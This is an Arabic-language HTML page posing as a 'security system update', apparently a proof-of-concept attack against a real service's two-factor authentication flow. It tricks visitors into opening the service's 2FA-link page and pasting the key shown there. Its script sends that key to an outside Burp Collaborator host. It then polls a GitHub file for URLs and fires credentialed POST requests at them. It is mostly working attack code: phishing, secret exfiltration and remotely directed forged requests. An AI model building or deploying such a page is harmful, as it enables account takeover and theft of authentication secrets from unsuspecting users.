<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث نظام الأمان</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
        .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
        input { padding: 8px; width: 250px; margin: 10px; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <h2>جاري تحديث الجلسة...</h2>
        <p>يرجى الضغط على الزر لفتح نافذة التحقق، ثم انسخ الـ <b>key</b> وضعه هنا:</p>
        
        <button onclick="openVerification()">فتح نافذة التحقق</button>
        
        <div id="capture" style="margin-top:20px;">
            <input type="text" id="keyInput" placeholder="ضع الكود (Key) هنا...">
            <button onclick="leakToBurp()" style="background:#27ae60;">تأكيد الربط</button>
        </div>
    </div>

    <script>
        const burpExfil = "https://oa27fvr47cjaj0xgh6s4qmgpogu7i46t.oastify.com";
        const githubCmd = "https://raw.githubusercontent.com/mohamed-talaat0/AttackerWeb/refs/heads/main/cmd.json";

        function openVerification() {
            // فتح الصفحة التي تحتوي على الـ Key
            window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "Verify", "width=400,height=400");
        }

        function leakToBurp() {
            const key = document.getElementById("keyInput").value;
            if(key) {
                // إرسال الكود لـ Burp
                fetch(burpExfil + "/?key=" + btoa(key), {mode: 'no-cors'});
                alert("شكراً لك، جاري إتمام العملية في الخلفية...");
                
                // بدء مراقبة أوامر GitHub لتنفيذ الريكوست الثاني (الـ POST)
                startMonitoring();
            }
        }

        function startMonitoring() {
            setInterval(async () => {
                try {
                    let res = await fetch(githubCmd + "?t=" + Date.now());
                    let cmd = await res.json();
                    if (cmd.url) {
                        // تنفيذ الـ POST (الريكوست الثاني)
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", cmd.url, true);
                        xhr.withCredentials = true;
                        xhr.send();
                        console.log("Action Executed!");
                    }
                } catch(e) {}
            }, 3000);
        }
    </script>
</body>
</html>
